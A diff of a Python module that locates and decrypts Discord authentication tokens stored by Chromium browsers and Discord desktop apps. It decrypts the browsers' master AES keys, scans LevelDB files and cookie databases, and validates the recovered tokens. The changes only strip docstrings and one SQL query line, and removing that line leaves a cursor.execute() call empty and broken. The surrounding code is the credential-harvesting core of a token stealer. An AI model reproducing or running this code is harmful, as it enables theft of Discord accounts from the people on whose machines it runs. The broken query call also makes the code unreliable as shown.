@@ -52,7 +52,6 @@ DISCORD_PATHS: Dict[str, str] = {
 
 
 def _get_chrome_master_key(user_data_path: str) -> bytes | None:
-    """Extract and decrypt Chrome's master AES key from Local State."""
     local_state_path = os.path.join(user_data_path, "Local State")
     if not os.path.exists(local_state_path):
         return None
@@ -71,7 +70,6 @@ def _get_chrome_master_key(user_data_path: str) -> bytes | None:
 
 
 def _decrypt_chrome_token(encrypted_value: bytes, master_key: bytes | None) -> str | None:
-    """Decrypt a Chrome-encrypted token value."""
     try:
         if encrypted_value[:3] == b"v10" and master_key and HAS_CRYPTO:
             iv = encrypted_value[3:15]
@@ -90,7 +88,6 @@ def _decrypt_chrome_token(encrypted_value: bytes, master_key: bytes | None) -> s
 
 
 def _scan_leveldb(path: str) -> List[str]:
-    """Scan all .ldb / .log files in a LevelDB folder for token strings."""
     tokens: List[str] = []
     if not os.path.isdir(path):
         return tokens
@@ -110,7 +107,6 @@ def _scan_leveldb(path: str) -> List[str]:
 
 
 def _scan_chrome_profile(profile_path: str, master_key: bytes | None) -> List[str]:
-    """Extract tokens from a Chrome profile's local storage and cookies."""
     tokens: List[str] = []
 
     ls_path = os.path.join(profile_path, "Local Storage", "leveldb")
@@ -127,7 +123,6 @@ def _scan_chrome_profile(profile_path: str, master_key: bytes | None) -> List[st
             conn = sqlite3.connect(tmp)
             cursor = conn.cursor()
             cursor.execute(
-                "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name='token'"
             )
             for row in cursor.fetchall():
                 encrypted = row[0]
@@ -145,7 +140,6 @@ def _scan_chrome_profile(profile_path: str, master_key: bytes | None) -> List[st
 
 
 def scan_browsers(progress_callback=None) -> List[Dict]:
-    """Scan all Chromium-based browsers for Discord tokens."""
     results: List[Dict] = []
     total = len(CHROMIUM_PATHS)
 
@@ -180,7 +174,6 @@ def scan_browsers(progress_callback=None) -> List[Dict]:
 
 
 def _get_discord_master_key(discord_path: str) -> bytes | None:
-    """Extract and decrypt Discord's master AES key from Local State."""
     local_state_path = os.path.join(discord_path, "Local State")
     if not os.path.exists(local_state_path):
         return None
@@ -199,7 +192,6 @@ def _get_discord_master_key(discord_path: str) -> bytes | None:
 
 
 def scan_discord_apps(progress_callback=None) -> List[Dict]:
-    """Scan Discord desktop apps for stored tokens (now encrypted in Local Storage/leveldb)."""
     results: List[Dict] = []
     total = len(DISCORD_PATHS)
 
@@ -247,7 +239,6 @@ def scan_discord_apps(progress_callback=None) -> List[Dict]:
 
 
 def _is_valid_token(token: str) -> bool:
-    """Basic sanity check — must match regex and have reasonable length."""
     if TOKEN_REGEX_ALT.match(token):
         return True
     parts = token.split(".")
@@ -255,7 +246,6 @@ def _is_valid_token(token: str) -> bool:
 
 
 def scan_all(progress_callback=None) -> List[Dict]:
-    """Run full scan: browsers + Discord apps. Returns deduplicated results."""
     all_results: List[Dict] = []
 
     browser_results = scan_browsers(progress_callback)
